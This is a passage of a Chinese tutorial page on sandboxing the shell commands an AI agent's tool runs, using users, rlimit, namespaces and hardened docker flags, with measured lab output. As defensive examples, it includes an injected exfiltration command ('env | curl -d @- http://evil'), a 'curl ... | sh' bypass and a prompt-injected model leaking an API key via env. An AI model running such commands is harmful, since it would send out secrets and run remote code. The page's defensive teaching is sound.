+  <p class="scene"><b>这一页的位置</b><span>站 04 下钻第 6 页，Java 后端架构板块的补给页：下一页 <a href="../agent/agent-sandbox.html">沙箱</a> 要用到这里的每一样机制。已经讲过的相邻内容：<a href="linux-config-secrets.html">Linux 信号和退出码 137、143</a>、<a href="docker-image-layers.html">Docker 镜像分层</a>。</span></p>
+</header>
+
+<section id="s1" data-role="pd">
+  <div class="mech-h"><h2><span class="sn">①</span>为什么需要：工具一旦能跑命令，模型就握着你的 shell</h2></div>
+  <p>值班助手 v1 的工具都是写死的 Python 函数，参数只能是关键字和时间。可迟早会有人想加一个 <code>run_command</code>：查个 <code>df -h</code>、<code>grep</code> 一下日志、<code>ss -s</code> 看连接数。这时模型写的字符串会变成真的进程，而模型可能被日志里的一句话带偏（<a href="../agent/tool-design.html#p-inject">工具怎么设计 · 反例 5</a>）。要回答的问题是：<b>这个进程最坏能做什么，怎么让“最坏”变得很小</b>。</p>
+  <figure>
+    <p class="swipe" aria-hidden="true">图比屏幕宽，左右滑动看全图 →</p>
+    <div class="fig-box">
+      <svg class="sv" viewBox="0 0 960 170" role="img" aria-label="模型写出命令字符串，你的代码用 subprocess 启动它，它成为 agent 的子进程，继承 agent 的用户、环境变量、网络和文件系统">
+        <g data-role="cg"><rect class="x-r" x="12" y="30" width="210" height="80" rx="12"/><text class="x-tc" x="26" y="52">模型的调用单</text><text class="x-mono" x="26" y="76">run_command(</text><text class="x-mono" x="26" y="94"> "grep -c ERROR app.log")</text></g>
+        <g data-role="g2"><rect class="x-r" x="282" y="30" width="200" height="80" rx="12"/><text class="x-tc" x="296" y="52">你的代码</text><text class="x-mono" x="296" y="76">subprocess.run(cmd,</text><text class="x-mono" x="296" y="94"> shell=True)</text></g>
+        <g data-role="bad"><rect class="x-rs" x="542" y="16" width="406" height="140" rx="12"/><text class="x-tc" x="556" y="38">子进程默认继承 agent 的一切</text>
+          <text class="x-t" x="556" y="64">用户 ubuntu：读写你的家目录、你的代码仓库</text>
+          <text class="x-t" x="556" y="86">环境变量：包括 ANTHROPIC_API_KEY</text>
+          <text class="x-t" x="556" y="108">网络：能连外网、能连内网数据库</text>
+          <text class="x-t" x="556" y="130">资源：能 fork 到满、吃光内存、永远不退出</text></g>
+        <line class="x-ed" x1="224" y1="70" x2="278" y2="70" marker-end="url(#xa)"/><line class="x-ed" x1="484" y1="70" x2="538" y2="70" marker-end="url(#xa)"/>
+      </svg>
+    </div>
+    <figcaption>Java 对照：<code>ProcessBuilder.start()</code> 起的进程同样继承 JVM 的用户、环境变量（<code>pb.environment()</code> 默认是父进程的拷贝）和工作目录。</figcaption>
+  </figure>
+</section>
+
+<section id="s2" data-role="other">
+  <div class="mech-h"><h2><span class="sn">②</span>没有它会怎样：一个普通子进程能做的事</h2></div>
+  <div class="tbl-wrap">
+    <table class="t">
+      <thead><tr><th>试一下</th><th>普通子进程（和 agent 同一个用户）</th></tr></thead>
+      <tbody>
+        <tr><th>读你的家目录</th><td class="bad">能：<code>ls ~</code> 列出 backup、claude、documents</td></tr>
+        <tr><th>写你的家目录</th><td class="bad">能：<code>touch ~/agent-was-here</code> 成功</td></tr>
+        <tr><th>连外网</th><td class="bad">能：<code>curl https://example.com</code> 返回 HTTP 200</td></tr>
+        <tr><th>读 <code>/etc/shadow</code></th><td class="good">不能：Permission denied，但这只因为普通用户本来就不能</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="tip"><span class="tag-real">实测</span> 2026-11-24，⑤ 程序的第 1 层，Ubuntu 22.04。</p>
+  <div class="verdict" data-role="bad"><b>不懂精华时的典型误用</b>：用字符串黑名单拦危险命令，比如禁掉 <code>rm</code>。<code>find . -delete</code>、<code>python3 -c "import shutil; ..."</code>、<code>curl ... | sh</code> 都能做同样的事。拦字符串是在猜攻击者会怎么写；隔离是不管它怎么写，内核都不让它够得着。</div>
+</section>
+
+<section id="s3" data-role="pd">
+  <div class="mech-h"><h2><span class="sn">③</span>相邻方案：从轻到重</h2></div>
+  <div class="tbl-wrap">
+    <table class="t">
+      <thead><tr><th>做法</th><th>隔离了什么</th><th>启动开销</th><th>漏洞面</th></tr></thead>
+      <tbody>
+        <tr><th>字符串黑名单</th><td class="bad">什么都没隔离</td><td>0</td><td class="bad">换个写法就绕过</td></tr>
+        <tr><th>换低权限用户 + rlimit + timeout</th><td class="mid">文件权限、单进程资源、时间</td><td class="good">≈0</td><td class="mid">网络、看得见的进程都还在</td></tr>
+        <tr><th>namespace（<code>unshare</code>、bubblewrap、nsjail）</th><td class="good">进程、网络、挂载、用户各看各的</td><td class="good">实测 &lt; 10 ms</td><td class="mid">共享宿主内核</td></tr>
+        <tr class="pick"><th><b>容器（<code>docker run</code> 加一组参数）</b></th><td class="good">以上全部 + cgroup 总量限制 + 只读根 + 去能力 + seccomp</td><td class="mid">实测约 0.3 秒</td><td class="mid">共享宿主内核；参数配错就白搭</td></tr>
+        <tr><th>用户态内核（gVisor）/ 轻量虚拟机（Firecracker）</th><td class="good">连内核都不共享</td><td class="bad">更重</td><td class="good">最小</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="pick-line"><b>本页讲到容器为止</b>：值班助手跑的是“你自己写的白名单命令 + 模型填的参数”，容器的隔离够用、0.3 秒的开销也付得起。要跑模型自己写的任意代码，再往虚拟机那一级走（Claude 的代码执行工具就是在 Anthropic 托管的容器里跑的）。</p>
+</section>
+
+<section id="s4" data-role="pd">
+  <div class="mech-h"><h2><span class="sn">④</span>原理：四层机制，各管一件事</h2></div>
+  <div class="know">
+    <b>先知道这些</b>
+    <ul>
+      <li><b>进程带着身份运行</b>：每个进程有 uid / gid，内核在每次 open、write、connect 时拿它来判权限。</li>
+      <li><b>fork + exec 会继承</b>：子进程默认继承父进程的 uid、环境变量、打开的文件、工作目录。</li>
+      <li><b>信号和退出码</b>：被 SIGKILL 杀掉退出码是 137（128+9），<code>timeout</code> 超时退出码是 124。见 <a href="linux-config-secrets.html">Linux 信号、启动脚本、配置和密钥</a>。</li>
+    </ul>
+  </div>
+
+  <h3 id="m-user">机制 1 · 用户和权限：它是谁</h3>
+  <p>换一个低权限用户运行（<code>nobody</code>，uid 65534），它就碰不到你的文件：家目录是 750，<code>nobody</code> 连列目录都不行（实测）。root 的特权在内核里被拆成 40 来项“能力”（capabilities），比如 <code>CAP_NET_ADMIN</code> 改网络、<code>CAP_SYS_ADMIN</code> 一大堆管理操作；容器里可以一项不留（<code>--cap-drop ALL</code>）。<code>no-new-privileges</code> 再堵上一条路：进程不能靠执行 setuid 程序（比如 <code>sudo</code>）重新拿到特权。</p>
+
+  <h3 id="m-limit">机制 2 · 资源限制：能用多少</h3>
+  <ul class="pains">
+    <li class="mid"><b>时间</b>：<code>timeout 2 cmd</code> 到点发 SIGTERM，退出码 124；Python 里是 <code>subprocess.run(..., timeout=2)</code>。</li>
+    <li class="mid"><b>单进程的上限 rlimit</b>：<code>ulimit</code> / <code>prlimit</code>，比如地址空间 <code>--as</code>、进程数 <code>--nproc</code>、CPU 秒数 <code>--cpu</code>。它是“每个进程”的，子进程各算各的。</li>
+    <li class="mid"><b>一组进程的总量 cgroup</b>：内核把一组进程放进一个 cgroup，限 <code>memory.max</code>、<code>pids.max</code>、<code>cpu.max</code>。超内存时内核的 OOM killer 发 SIGKILL，退出码 137。容器的 <code>--memory</code>、<code>--pids-limit</code>、<code>--cpus</code> 就是在设这几个文件。</li>
+  </ul>
+  <p>Java 比方：<code>-Xmx</code> 管的是 JVM 自己的堆，像 rlimit 只管自己；容器的内存上限像给整台机器装了个闸，JVM 堆外、子进程都算在里面，所以 Java 进程在容器里也会 137（<a href="k8s-resources-probes.html">requests、limits 和探针</a>那页讲过）。</p>
+
+  <h3 id="m-ns">机制 3 · namespace：看得见什么</h3>
+  <p>namespace 不是限制“能做什么”，而是改变“看见的世界”：同一个内核，给这组进程一份独立的视图。常用的几种：</p>
+  <div class="tbl-wrap">
+    <table class="t">
+      <thead><tr><th>namespace</th><th>隔离什么</th><th>⑤ 里看到的</th></tr></thead>
+      <tbody>
+        <tr><th>PID</th><td>进程号：里面的第一个进程是 1 号，看不到外面的进程</td><td class="good"><code>ps -e</code> 只剩自己</td></tr>
+        <tr><th>NET</th><td>网卡、路由、端口</td><td class="good">只有一个关着的 <code>lo</code>，连不上外网</td></tr>
+        <tr><th>MNT</th><td>挂载点：可以给它一份只含必要目录的文件系统</td><td>容器的根目录就是这样来的</td></tr>
+        <tr><th>USER</th><td>uid 映射：里面的 root 映射到外面的普通用户</td><td class="bad">里面 <code>id -u</code> 是 0，可读 <code>/etc/shadow</code> 照样被拒；写家目录却能成功，因为外面看它就是你</td></tr>
+        <tr><th>UTS、IPC、cgroup</th><td>主机名、共享内存、cgroup 视图</td><td>—</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="tip">user namespace 让普通用户也能建其他 namespace（⑤ 第 3 层全程没有 sudo）；有的发行版出于安全考虑默认关掉了这个能力，本机 Ubuntu 22.04 是开着的。</p>
+
+  <h3 id="m-layers">机制 4 · 四层叠起来：每层拦住不同的东西</h3>
+  <div class="stepper" id="stp" tabindex="0" aria-label="分步动画：四层机制逐层加上，每层拦住哪些动作，左右方向键切换">
+    <div class="st-ctl">
+      <button class="btn" type="button" id="st-prev">← 上一步</button>
+      <button class="btn primary" type="button" id="st-next">下一步 →</button>
+      <button class="btn" type="button" id="st-auto" aria-pressed="false">自动播放</button>
+      <button class="btn" type="button" id="st-reset">从头来</button>
+      <span class="pos" id="st-pos" aria-live="polite"></span>
+    </div>
+    <p class="swipe" aria-hidden="true">图比屏幕宽，左右滑动看全图 →</p>
+    <div class="fig-box"><svg class="sv" viewBox="0 0 960 330" role="img" aria-label="七个动作在五种配置下能不能做到：普通子进程全能；换用户加资源限制拦住家目录、内存、时间；namespace 拦住网络和看进程；容器拦住除了时间以外的全部；容器加超时全部拦住">
+      <text class="x-tb" x="16" y="34">模型提议的命令想做……</text>
+      <text class="x-t" x="16" y="74">读你的家目录</text><text class="x-t" x="16" y="108">写你的家目录</text><text class="x-t" x="16" y="142">连外网</text><text class="x-t" x="16" y="176">看见别的进程</text><text class="x-t" x="16" y="210">fork 炸弹</text><text class="x-t" x="16" y="244">吃光内存</text><text class="x-t" x="16" y="278">永远不退出</text>
+      <g id="n-l1" data-role="bad"><rect class="x-rs" x="200" y="16" width="140" height="280" rx="10"/><text class="x-tc" x="270" y="36" text-anchor="middle">普通子进程</text>
+        <text class="x-bad" x="270" y="74" text-anchor="middle">能</text><text class="x-bad" x="270" y="108" text-anchor="middle">能</text><text class="x-bad" x="270" y="142" text-anchor="middle">能</text><text class="x-bad" x="270" y="176" text-anchor="middle">能</text><text class="x-bad" x="270" y="210" text-anchor="middle">能</text><text class="x-bad" x="270" y="244" text-anchor="middle">能</text><text class="x-bad" x="270" y="278" text-anchor="middle">能</text></g>
+      <g id="n-l2" data-role="pd"><rect class="x-rs" x="350" y="16" width="140" height="280" rx="10"/><text class="x-tc" x="420" y="36" text-anchor="middle">nobody + 限额</text>
+        <text class="x-tc" x="420" y="74" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="420" y="108" text-anchor="middle">✕ 拦住</text><text class="x-bad" x="420" y="142" text-anchor="middle">能</text><text class="x-bad" x="420" y="176" text-anchor="middle">能</text><text class="x-bad" x="420" y="210" text-anchor="middle">能*</text><text class="x-tc" x="420" y="244" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="420" y="278" text-anchor="middle">✕ 拦住</text></g>
+      <g id="n-l3" data-role="cg"><rect class="x-rs" x="500" y="16" width="140" height="280" rx="10"/><text class="x-tc" x="570" y="36" text-anchor="middle">namespace</text>
+        <text class="x-bad" x="570" y="74" text-anchor="middle">能</text><text class="x-bad" x="570" y="108" text-anchor="middle">能</text><text class="x-tc" x="570" y="142" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="570" y="176" text-anchor="middle">✕ 拦住</text><text class="x-bad" x="570" y="210" text-anchor="middle">能</text><text class="x-bad" x="570" y="244" text-anchor="middle">能</text><text class="x-bad" x="570" y="278" text-anchor="middle">能</text></g>
+      <g id="n-l4" data-role="rn"><rect class="x-rs" x="650" y="16" width="140" height="280" rx="10"/><text class="x-tc" x="720" y="36" text-anchor="middle">容器</text>
+        <text class="x-tc" x="720" y="74" text-anchor="middle">✕ 没挂载</text><text class="x-tc" x="720" y="108" text-anchor="middle">✕ 没挂载</text><text class="x-tc" x="720" y="142" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="720" y="176" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="720" y="210" text-anchor="middle">✕ 拦住</text><text class="x-tc" x="720" y="244" text-anchor="middle">✕ 137</text><text class="x-bad" x="720" y="278" text-anchor="middle">能</text></g>
+      <g id="n-l5" data-role="done"><rect class="x-rs" x="800" y="16" width="148" height="280" rx="10"/><text class="x-tc" x="874" y="36" text-anchor="middle">容器 + 超时</text>
+        <text class="x-tc" x="874" y="74" text-anchor="middle">✕</text><text class="x-tc" x="874" y="108" text-anchor="middle">✕</text><text class="x-tc" x="874" y="142" text-anchor="middle">✕</text><text class="x-tc" x="874" y="176" text-anchor="middle">✕</text><text class="x-tc" x="874" y="210" text-anchor="middle">✕</text><text class="x-tc" x="874" y="244" text-anchor="middle">✕</text><text class="x-tc" x="874" y="278" text-anchor="middle">✕ 124</text></g>
+      <text class="x-ts" x="350" y="318">* ⑤ 第 2 层没设 <tspan font-family="monospace">--nproc</tspan>；设了就能拦住单个用户的进程数</text>
+    </svg></div>
+    <div class="st-cap" data-role="of" id="st-cap"><b class="h">准备</b>点“下一步”。</div>
+  </div>
+
+  <h3 id="m-design">为什么这样设计：共享内核、按需叠加</h3>
+  <div class="design">
+    <div class="card" data-role="pd"><h3>Linux 的做法：几样独立的机制，按需组合</h3><ul class="pains">
+      <li class="ok">每样只管一件事（身份、额度、视图、特权），可以单独用：只想限时间就 <code>timeout</code>，只想断网就一个 NET namespace。</li>
+      <li class="ok">都在同一个内核里，开销极小：namespace 不到 10 毫秒，整套容器 0.3 秒（实测）。</li>
+      <li class="mid">代价：组合要你自己配，漏掉一层就留一个洞（容器不管时间，实测“永远不退出”照样能）；而且所有进程共享一个内核，内核有漏洞就可能逃出去。</li>
+    </ul></div>
+    <div class="card" data-role="other"><h3>另一种：每个任务一台虚拟机</h3><ul class="pains">
+      <li class="ok">连内核都隔开，逃逸难得多；跑完全不可信的代码时选它（gVisor、Firecracker 这类就是为此做轻的）。</li>
+      <li class="bad">启动和内存开销大得多；值班助手几秒一次的只读命令用不着。</li>
+    </ul></div>
+  </div>
+  <div class="verdict" data-role="pd"><b>决定胜负的约束</b>：值班助手要隔离的是“你写的白名单命令 + 模型填的参数”，而且一次排查要跑好几次。共享内核的容器在隔离强度和开销之间正好；真要跑模型自己写的任意代码，就往虚拟机那一级走。</div>
+
+  <h3>最少的写法</h3>
+  <div class="codebox"><div class="code-bar"><b>一条够用的 docker run</b><span>每个参数管什么，见 ⑥</span></div><pre><code>docker run --rm \
+  --network none \                       <span class="cm"># NET：断网</span>
+  --read-only --tmpfs /tmp:size=16m \    <span class="cm"># MNT：根目录只读，只给一小块临时目录</span>
+  -v /var/log/order-svc:/logs:ro \       <span class="cm"># 只把要读的日志只读挂进去</span>
+  --user 65534:65534 \                   <span class="cm"># 用户：nobody</span>
+  --cap-drop ALL --security-opt no-new-privileges \
+  --pids-limit 20 --memory 32m --memory-swap 32m --cpus 0.5 \   <span class="cm"># cgroup：进程数、内存、CPU</span>
+  alpine:3.20 grep -c ERROR /logs/app.log</code></pre></div>
+  <p>外面再套一层时间：<code>subprocess.run(cmd, timeout=20)</code>。注意超时只杀得掉 <code>docker</code> 客户端进程，容器要配合 <code>--name</code> 和 <code>docker kill</code> 才停得干净（⑥ 坑 5）。</p>
+</section>
+
+<section id="s5" data-role="pd">
+  <div class="mech-h"><h2><span class="sn">⑤</span>亲眼看到：四层笼子，每层跑几条命令</h2></div>
+  <p>一个 Python 脚本，按层跑十几条 shell 命令，打印退出码和输出的第一行。第 3 层全程不用 sudo；第 4 层要 docker 和 <code>alpine:3.20</code>（8.8 MB）。</p>
+  <div class="codebox"><div class="code-bar"><span class="n">⑤</span><b>linux-process-isolation/main.py（节选）</b><a href="https://github.com/archeu/study-labs/tree/main/agent/linux-process-isolation">完整代码 →</a></div><pre><code>DOCKER = ("sudo docker run --rm --network none --read-only --user 65534:65534 --cap-drop ALL "
+          "--security-opt no-new-privileges --pids-limit 20 --memory 32m --memory-swap 32m alpine:3.20")
+LAYERS = {
+    2: ("资源限制", [("超时", "timeout 2 sleep 10"),
+                    ("内存", "prlimit --as=200000000 python3 -c 'b = bytearray(500_000_000)'"),
+                    ("换用户", "sudo -n -u nobody touch $HOME/x")]),
+    3: ("namespace", [("PID", "unshare --user --map-root-user --pid --fork --mount-proc ps -e"),
+                      ("NET", "unshare --user --map-root-user --net sh -c 'ip -brief link; curl ...'"),
+                      ("USER", "unshare --user --map-root-user sh -c 'id -u; cat /etc/shadow'")]),
+    4: ("容器", [("fork 炸弹", f"{DOCKER} sh -c 'for i in $(seq 40); do sleep 3 & done; wait'"),
+                 ("吃内存", f"{DOCKER} sh -c 'head -c 200m /dev/zero | tail > /dev/null'"), ...]),
+}</code></pre></div>
+  <ol class="steps-out">
+    <li><b>1 准备</b><span>Linux；<code>sudo docker pull alpine:3.20</code>。</span></li>
+    <li><b>2 跑</b><span><code>cd agent &amp;&amp; python3 linux-process-isolation/main.py</code>，只看一层加 <code>--layer 3</code>。不需要 uv，也不需要模型。</span></li>
+  </ol>
+  <div class="codebox"><div class="code-bar"><span class="tag-real">实测</span><b>运行输出（节选）</b><span>2026-11-24 · Ubuntu 22.04 · 内核 6.8 · Docker 27.3</span></div><pre class="console">第 2 层 · 资源限制：timeout、prlimit（ulimit）
+   $ timeout 2 sleep 10                                       退出码 <b>124</b>
+   $ prlimit --as=200000000 python3 -c 'b = bytearray(...)'   退出码 1  <b>MemoryError</b>
+   $ sudo -n -u nobody touch $HOME/x                          退出码 1  touch: cannot touch '/home/ubuntu/x': <b>Permission denied</b>
+
+第 3 层 · namespace：看到的世界变小（不需要 root）
+   $ unshare ... --pid --fork --mount-proc ps -e              退出码 0  PID TTY TIME CMD / <b>1 ? 00:00:00 ps</b>
+   $ unshare ... --net sh -c 'ip -brief link; curl ...'       退出码 0  <b>lo DOWN</b> / 连不上
+   $ unshare --user --map-root-user sh -c 'id -u; cat ...'    退出码 1  <span class="r">0</span> / cat: /etc/shadow: Permission denied
+
+第 4 层 · 容器：namespace + cgroup + 只读根 + 去能力，一条 docker run
+ · 身份是 nobody         退出码 0    uid=65534(nobody) gid=65534(nobody)
+ · 断网                  退出码 0    <b>联网失败</b>
+ · 根目录只读            退出码 1    touch: /x: <b>Read-only file system</b>
+ · 进程数上限 20         退出码 2    sh: <b>can't fork</b>: Resource temporarily unavailable
+ · 内存上限 32 MB        退出码 <b>137</b>  Killed
+
+<span class="c">启动开销：docker run --rm alpine true 三次 0.37 / 0.28 / 0.29 s；unshare 三次都 &lt; 0.01 s</span></pre></div>
+  <div class="lab-res" data-role="pd"><b>读出来的结论</b><ul>
+    <li>每一层都拦住了它负责的那几样，也只拦住那几样：namespace 断了网、藏起了别的进程，却管不了内存和时间。</li>
+    <li>user namespace 里 <code>id -u</code> 是 0，读 <code>/etc/shadow</code> 照样被拒；同样的命令去写家目录却成功了，在外面看那个文件属于 ubuntu。“容器里的 root”不等于宿主的 root，但也不等于“什么都做不了”。</li>
+    <li>容器的 137 和 <code>timeout</code> 的 124 是两种不同的死法：前者是 cgroup 的 OOM killer 发的 SIGKILL，后者是到点发的 SIGTERM。看退出码就知道是哪道闸拦的。</li>
+    <li>容器本身不限时间：要靠外面的超时。</li>
+  </ul></div>
+  <div class="verdict" data-role="done"><b>到这里已经能交差了</b>：一条带齐参数的 <code>docker run</code> + 外面一层超时，就是一个够用的命令笼子。<br><b>已知还没处理的细节</b>：容器默认是 root（<a href="#p-root">坑 1</a>）；环境变量里的密钥（<a href="#p-env">坑 4</a>）；超时杀不干净（<a href="#p-kill">坑 5</a>）。</div>
+</section>
+
+<section id="s6" data-role="pd">
+  <div class="mech-h"><h2><span class="sn">⑥</span>细节：容器参数一个配错，笼子就有洞</h2></div>
+  <h3>第一圈 · 注意事项</h3>
+  <div class="pits">
+    <div class="pit" id="p-root"><b><em>1</em>不写 --user，容器里就是 root<a class="rootmark" href="#m-user">← ④ 机制 1</a></b>
+      <dl><dt>现象</dt><dd>容器里能改它看得到的一切文件，包括可写挂载进来的目录。</dd><dt>根源</dt><dd>大多数镜像默认以 uid 0 运行；没开 user namespace 重映射时，它就是宿主的 uid 0，只是能力被裁过一部分。</dd><dt>做法</dt><dd class="fix">总是 <code>--user 65534:65534</code>（或镜像里建专用用户），配 <code>--cap-drop ALL</code> 和 <code>no-new-privileges</code>。</dd></dl>
+    </div>
+    <div class="pit" id="p-sock"><b><em>2</em>挂了 docker.sock 或加了 --privileged<a class="rootmark" href="#m-user">← ④ 机制 1</a></b>
+      <dl><dt>现象</dt><dd>“为了方便在容器里看别的容器”，把 <code>/var/run/docker.sock</code> 挂进去；或者图省事加 <code>--privileged</code>。</dd><dt>根源</dt><dd>能访问 docker.sock 就能起一个挂载宿主根目录的特权容器，等于宿主 root；<code>--privileged</code> 把能力和设备全放开，前面几层白做。</dd><dt>做法</dt><dd class="fix">沙箱容器永远不挂 docker.sock、不加 --privileged；需要的信息由宿主上的你的代码查好，再作为参数或只读文件给进去。</dd></dl>
+    </div>
+    <div class="pit" id="p-rw"><b><em>3</em>挂载目录忘了 :ro<a class="rootmark" href="#m-ns">← ④ 机制 3</a></b>
+      <dl><dt>现象</dt><dd>根目录是只读的，<code>-v /var/log/order-svc:/logs</code> 却是可写的，日志被改了或删了。</dd><dt>根源</dt><dd><code>--read-only</code> 只管容器自己的根文件系统，挂进来的卷按挂载参数来。</dd><dt>做法</dt><dd class="fix">只挂要读的那几个目录，一律加 <code>:ro</code>；要写只给 <code>--tmpfs /tmp:size=16m</code>。</dd></dl>
+    </div>
+    <div class="pit" id="p-env"><b><em>4</em>子进程继承了 ANTHROPIC_API_KEY<a class="rootmark" href="#m-user">← ④ 先知道</a></b>
+      <dl><dt>现象</dt><dd>模型被注入后执行 <code>env</code>，回执里出现了你的 API key，它又被写进了对话日志。</dd><dt>根源</dt><dd>fork + exec 默认继承全部环境变量；agent 进程里恰好有密钥。</dd><dt>做法</dt><dd class="fix"><code>subprocess.run(..., env={"PATH": "/usr/bin:/bin"})</code> 只给最少的变量；容器只用 <code>-e</code> 显式传需要的。密钥怎么管见 <a href="linux-config-secrets.html">配置和密钥</a>。</dd></dl>
+    </div>
+    <div class="pit" id="p-kill"><b><em>5</em>超时只杀了外层，里面的还在跑<a class="rootmark" href="#m-limit">← ④ 机制 2</a></b>
+      <dl><dt>现象</dt><dd><code>subprocess.run("...", shell=True, timeout=20)</code> 超时返回了，<code>ps</code> 一看命令还在跑；或者 <code>docker run</code> 的客户端被杀了，容器还活着。</dd><dt>根源</dt><dd>超时后 Python 只杀它直接启动的那个进程（shell 或 docker 客户端），孙进程和容器不在它手里。</dd><dt>做法</dt><dd class="fix"><code>start_new_session=True</code> 让命令自成一个进程组，超时用 <code>os.killpg</code> 整组杀；容器起名 <code>--name sb-xxx</code>，超时后 <code>docker kill sb-xxx</code>。</dd></dl>
+    </div>
+    <div class="pit" id="p-half"><b><em>6</em>只限了内存，没限进程数和 CPU<a class="rootmark" href="#m-limit">← ④ 机制 2</a></b>
+      <dl><dt>现象</dt><dd>内存守住了，fork 炸弹或者一个死循环把宿主两个核吃满，值班助手自己也卡住了。</dd><dt>根源</dt><dd>cgroup 的每一项是独立的，不设就是不限。</dd><dt>做法</dt><dd class="fix"><code>--memory</code>、<code>--memory-swap</code>（等于内存，禁止换出）、<code>--pids-limit</code>、<code>--cpus</code> 四个一起写。</dd></dl>
+    </div>
+  </div>
+
+  <h3>第二圈 · 使用规范</h3>
+  <ul class="rules-list">
+    <li><b>沙箱参数写成一个函数，不在各处拼字符串</b>：防某个调用点漏了 <code>--network none</code>。</li>
+    <li><b>默认全关，需要什么开什么</b>：要读日志就只读挂日志目录，要访问一个内部接口就单独给一个只通那个地址的网络；防“先全开再慢慢收”。</li>
+    <li><b>记录每次沙箱执行：命令、退出码、耗时、被哪道闸拦</b>：防出了事查不清；退出码 124、137 本身就是线索。</li>
+    <li><b>镜像固定版本、尽量小</b>：防镜像里自带一堆用不上的工具（curl、编译器），等于给了攻击者工具箱。</li>
+  </ul>
+
+  <h3>第三圈 · 深处</h3>
+  <div class="two">
+    <div class="card" data-role="rn"><h4>seccomp：连系统调用都管</h4><p>Docker 默认带一份 seccomp 配置，挡掉几十个容器里用不着、又危险的系统调用（比如加载内核模块、改时钟）。可以再写更严的白名单，只放行命令真正要用的那些。它是“共享内核”这个弱点上的又一层补丁。</p></div>
+    <div class="card" data-role="cg"><h4>rootless 和 user namespace 重映射</h4><p>Docker 可以让容器里的 root 映射到宿主上一个没有权限的 uid（userns-remap，或者整个 Docker 以普通用户运行）。这样就算容器被攻破、拿到了“root”，到了宿主也只是个普通用户，正是 ⑤ 第 3 层看到的效果。</p></div>
+  </div>
+
+  <h3>下一圈</h3>
+  <ul class="next">
+    <li>沙箱怎么接进 agent：命令白名单、参数校验、执行器（下一页 <a href="../agent/agent-sandbox.html">沙箱</a>）。</li>
+    <li>Kubernetes 里的同一套东西：securityContext、Pod 的资源 limits、NetworkPolicy（<a href="k8s-resources-probes.html">requests、limits 和探针</a>）。</li>
+    <li>gVisor、Firecracker：不共享内核的沙箱，跑模型自己写的代码时用。</li>
+  </ul>
+</section>
+
+<section id="loop" data-role="other">
+  <div class="mech-h"><h2><span class="sn">↺</span>回到⑤：改一改</h2></div>
+  <ol class="rules-list">
+    <li><b>造一个洞再补上</b>：第 4 层去掉 <code>--user</code>，跑 <code>id</code> 看是不是 root；再挂一个不带 <code>:ro</code> 的临时目录，在里面写文件，回到宿主看文件归谁（坑 1、3）。</li>
+    <li><b>杀干净</b>：用 <code>subprocess.run("sleep 100 &amp; sleep 100", shell=True, timeout=2)</code>，超时后 <code>ps</code> 看残留；改成 <code>start_new_session=True</code> + <code>os.killpg</code> 再看（坑 5）。</li>
+    <li><b>清环境变量</b>：<code>FOO=secret python3 -c "import subprocess; print(subprocess.run('env', shell=True, capture_output=True, text=True).stdout)"</code> 看 FOO 在不在，再加 <code>env={"PATH": "/usr/bin:/bin"}</code>（坑 4）。</li>
+  </ol>
+  <h3>自测</h3>
+  <div class="faq">
+    <details><summary>1. 用一句话说出这一页的精华</summary><p>子进程默认继承 agent 的一切；用户和权限、资源限制、namespace、容器加固四层各管一件事，叠起来再加超时，才是一个没有明显洞的笼子。</p></details>
+    <details><summary>2. 为什么黑名单拦命令不算隔离？</summary><p>它在猜攻击者怎么写，换个写法就过去；隔离靠内核判权限、限额度、改视图，不管命令怎么写都够不着。</p></details>
+    <details><summary>3. 容器里 uid 是 0，算不算宿主的 root？</summary><p>看配置：没开 user namespace 重映射时，它就是宿主的 uid 0，只是被裁了能力；开了的话（像 ⑤ 第 3 层），它映射到宿主的普通用户。</p><p class="from">从 ④ 机制 1、3 推出。</p></details>
+    <details><summary>4. 预测：只用 <code>unshare --net --pid</code>，不限内存，命令 <code>python3 -c "x=' '*10**10"</code> 会怎样？</summary><p>namespace 不管资源，它会一直申请内存，直到撞上宿主的内存上限，可能把宿主上的其他进程（包括 agent 自己）一起拖慢或被 OOM 杀掉。</p><p class="from">从 ④ 机制 4 的分层表推出。</p></details>
+    <details><summary>5. 预测：容器跑 <code>sleep 3600</code>，加了 --memory 和 --pids-limit，它多久结束？</summary><p>一小时：容器不限时间。要外面的超时，而且要能杀掉容器本身（坑 5）。</p></details>
+    <details><summary>6. 放回全景：第 6 站的命令被注入成 <code>env | curl -d @- http://evil</code>，哪几层分别能拦？</summary><p>环境变量清掉（坑 4）让 env 里没有密钥；<code>--network none</code> 让 curl 连不出去；更前面还有下一页的命令白名单根本不放行 env 和 curl，以及审批。多层里任何一层守住都能挡住这次。</p></details>
+  </div>
+</section>
+</main>
+
+<footer>
+  <p>档位：标准。本机跑过（2026-11-24，Ubuntu 22.04.5，内核 6.8.0，Docker 27.3.1，alpine:3.20）：⑤ 的四层全部命令、user namespace 里写家目录的文件归属、容器和 unshare 的启动耗时。按文档和常识（没有在本页实测）：Docker 默认 seccomp 配置、userns-remap、超时只杀直接子进程的行为、gVisor 和 Firecracker 的定位。</p>
+  <p>相关：<a href="../agent/pano-04-triage-agent.html">全景：一次排障提问，agent 来回了几轮</a> · 上一页 <a href="../agent/parallel-tool-calls.html">并行工具调用</a> · 下一页 <a href="../agent/agent-sandbox.html">沙箱：只读优先、命令白名单、隔离执行</a> · <a href="linux-config-secrets.html">Linux 信号、配置和密钥</a> · <a href="docker-image-layers.html">Docker 镜像分层</a></p>
+</footer>
+<script>
+/*SIM-START*/
+// 纯函数，不碰 DOM。发布前截出这一段在 node 里跑。
+const STEPS = [
+  { h: "普通子进程", cap: "和 agent 同一个用户、同一套环境变量、同一张网：七件事全都做得到（实测：写家目录成功、curl 返回 200）。", lit: ["n-l1"] },
+  { h: "换 nobody + rlimit + timeout", cap: "家目录是 750，nobody 读写都不行；prlimit 限住地址空间，申请 500 MB 直接 MemoryError；timeout 到点退出码 124。但网络、别的进程照样够得着。", lit: ["n-l2"] },
+  { h: "namespace", cap: "PID、NET namespace 让它只看得见自己、只有一个关着的 lo。可它还是你：user namespace 里的 root 写家目录照样成功，内存和时间也不管。", lit: ["n-l3"] },
